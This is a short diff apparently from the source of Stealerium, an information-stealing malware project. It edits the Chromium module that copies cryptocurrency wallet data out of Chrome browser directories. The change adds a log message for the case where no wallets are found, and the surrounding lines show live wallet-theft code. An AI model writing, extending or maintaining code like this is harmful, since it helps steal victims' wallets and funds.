@@ -156,7 +156,11 @@ namespace Stealerium.Target.Browsers.Chromium
                 Directory.CreateDirectory(sSaveDir);
 
                 foreach (var array in ChromeWalletsDirectories) CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]);
-                if (Counter.BrowserWallets == 0) Filemanager.RecursiveDelete(sSaveDir);
+                if (Counter.BrowserWallets == 0)
+                {
+                    Filemanager.RecursiveDelete(sSaveDir);
+                    Logging.Log("Chrome Browser Wallets >> No wallets from Chrome browser\n");
+                }
             }
             catch (Exception ex)
             {
